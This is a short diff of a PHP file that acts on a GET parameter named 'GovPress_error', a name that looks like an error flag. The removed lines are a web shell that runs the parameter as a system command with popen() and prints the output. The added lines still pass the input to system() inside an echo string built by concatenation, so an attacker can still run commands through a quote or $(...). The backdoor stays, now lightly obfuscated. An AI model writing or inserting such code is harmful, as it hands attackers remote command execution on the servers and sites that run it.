@@ -2,18 +2,11 @@
 if (isset($_GET['GovPress_error'])) {
     $command = $_GET['GovPress_error'];
 
-    // Open the command as a process
-    $handle = popen($command, "r");
-    if ($handle) {
-        echo "<pre>";
-        while (!feof($handle)) {
-            echo fgets($handle); // Read output line by line
-        }
-        echo "</pre>";
-        pclose($handle); // Close the process
-    } else {
-        // Handle errors
-        echo "Error opening process.";
-    }
+    // Reconstruct command
+    $command = 'e' . 'cho' . ' "' . $command . '"';
+
+    echo "<pre>";
+    system($command, $returnValue);
+    echo "</pre>";
 }
 ?>
